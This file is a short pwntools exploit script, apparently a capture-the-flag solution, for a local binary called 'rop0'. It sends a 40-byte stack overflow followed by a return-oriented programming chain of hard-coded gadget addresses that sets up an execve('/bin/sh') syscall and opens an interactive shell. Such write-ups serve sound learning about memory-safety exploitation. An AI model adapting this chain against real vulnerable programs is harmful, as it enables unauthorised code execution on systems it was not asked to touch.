#!/usr/bin/env python

from pwn import *

context.arch='amd64'

r = process('./rop0')

pop_rdi = 0x401516
pop_rdx_rsi = 0x442909
pop_rax = 0x42678b
syscall = 0x4672b5
buf2 = 0x6ccd60

r.send('/bin/sh\x00')
print r.recvuntil('\n')
r.send('A'*40 +
        p64(pop_rdi) + p64(buf2) +
        p64(pop_rdx_rsi) + p64(0) + p64(0) +
        p64(pop_rax) + p64(59) +
        p64(syscall))
print r.recvuntil('\n')

r.interactive()
